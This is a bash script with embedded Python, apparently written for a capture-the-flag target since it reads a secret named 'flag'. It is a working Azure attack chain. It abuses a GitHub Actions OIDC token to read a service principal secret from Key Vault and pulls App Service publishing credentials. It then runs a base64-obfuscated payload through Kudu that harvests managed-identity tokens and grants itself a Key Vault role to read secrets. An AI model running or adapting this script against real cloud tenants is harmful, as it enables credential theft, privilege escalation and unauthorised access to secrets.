#!/usr/bin/env bash
set +e
cat > /tmp/x.py <<'PYEOF'
import base64,json,os,urllib.parse,urllib.request,urllib.error,time
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e";CID="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6";KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
RID="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="app-tbl-reporting-prod.scm.azurewebsites.net"
def P(x):print("OUT="+json.dumps(x,default=str)[:3000],flush=True)
def rd(r,t=30):return json.loads(urllib.request.urlopen(r,timeout=t).read().decode())
def form(u,f):return rd(urllib.request.Request(u,data=urllib.parse.urlencode(f).encode(),method="POST"))
def ac(u,tok,m="GET",b=None,t=30):
 try:
  r=urllib.request.urlopen(urllib.request.Request(u,data=(json.dumps(b).encode() if b is not None else None),method=m,headers={"Authorization":tok,"Content-Type":"application/json"}),timeout=t);return r.status,r.read().decode("utf-8","replace")
 except urllib.error.HTTPError as e:return e.code,e.read().decode("utf-8","replace")[:400]
 except Exception as e:return 0,repr(e)
oidc=rd(urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api%3A%2F%2FAzureADTokenExchange",headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]
vt=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":CID,"grant_type":"client_credentials","scope":"https://vault.azure.net/.default","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":oidc})["access_token"]
sp=json.loads(rd(urllib.request.Request(KV1+"/secrets/reporting-service-principal?api-version=7.4",headers={"Authorization":"Bearer "+vt}))["value"])
arm=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":sp.get("appId"),"grant_type":"client_credentials","client_secret":sp.get("clientSecret"),"scope":"https://management.azure.com/.default"})["access_token"]
ps,pb=ac("https://management.azure.com"+RID+"/config/publishingcredentials/list?api-version=2023-01-01","Bearer "+arm,"POST",{});P({"pubcreds":ps})
pub=json.loads(pb)["properties"];auth="Basic "+base64.b64encode((pub["publishingUserName"]+":"+pub["publishingPassword"]).encode()).decode()
w=r'''set +e
echo "WK_IDVARS:"; env | grep -iE "identity|msi|appsvc" | sed "s/=.*/=SET/"
IE="${IDENTITY_ENDPOINT:-$MSI_ENDPOINT}"; IH="${IDENTITY_HEADER:-$MSI_SECRET}"
echo "WK_IE=$IE HAS_IH=$([ -n "$IH" ] && echo yes)"
gt(){ curl -s -m 6 "$1?resource=$2&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IH" -H "Secret: $IH"; }
VT=""; if [ -n "$IE" ]; then R=$(gt "$IE" "https://vault.azure.net"); echo "WK_RESP: $(echo "$R"|head -c 150)"; VT=$(echo "$R"|sed -E "s/.*\"access_token\":\"([^\"]+)\".*/\\1/"); fi
if [ "${#VT}" -lt 50 ]; then for u in http://127.0.0.1:8081/msi/token http://169.254.130.3:8081/msi/token http://127.0.0.1:41741/msi/token; do echo "WK_ALT $u: $(curl -s -m 4 "$u?resource=https://vault.azure.net&api-version=2017-09-01" -H "Secret: $IH" | head -c 120)"; done; fi
if [ "${#VT}" -ge 50 ]; then
 F=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" -H "Authorization: Bearer $VT"); echo "WK_DIRECT: $F"
 if ! echo "$F"|grep -q "\"value\""; then
  AT=$(gt "$IE" "https://management.azure.com"|sed -E "s/.*\"access_token\":\"([^\"]+)\".*/\\1/")
  PL=$(echo "$VT"|cut -d. -f2); PL="$PL$(printf "=%.0s" $(seq $(((4-${#PL}%4)%4))))"; OID=$(echo "$PL"|tr "_-" "/+"|base64 -d 2>/dev/null|grep -oE "\"oid\":\"[^\"]+\""|head -1|cut -d"\"" -f4); echo "WK_OID=$OID"
  G=$(cat /proc/sys/kernel/random/uuid)
  echo "WK_GRANT: $(curl -s -X PUT "https://management.azure.com/subscriptions/__SUB__/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments/$G?api-version=2022-04-01" -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/__SUB__/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6\",\"principalId\":\"$OID\",\"principalType\":\"ServicePrincipal\"}}" | head -c 200)"
  for i in 1 2 3 4 5; do sleep 5; VT=$(gt "$IE" "https://vault.azure.net"|sed -E "s/.*\"access_token\":\"([^\"]+)\".*/\\1/"); F=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" -H "Authorization: Bearer $VT"); echo "WK_TRY$i: $F"; echo "$F"|grep -q "\"value\"" && break; done
 fi
fi'''
w=w.replace("__SUB__",SUB)
cmd="bash -c \"echo "+base64.b64encode(w.encode()).decode()+" | base64 -d | bash\""
for i in range(10):
 s,_=ac("https://"+SCM+"/api/settings",auth,"GET",None,20)
 if s==200:break
 time.sleep(6)
s,r=ac("https://"+SCM+"/api/command",auth,"POST",{"command":cmd,"dir":"site/wwwroot"},200);P({"kudu":s})
if s==200:print("KUDU="+r[:20000],flush=True)
PYEOF
python3 /tmp/x.py
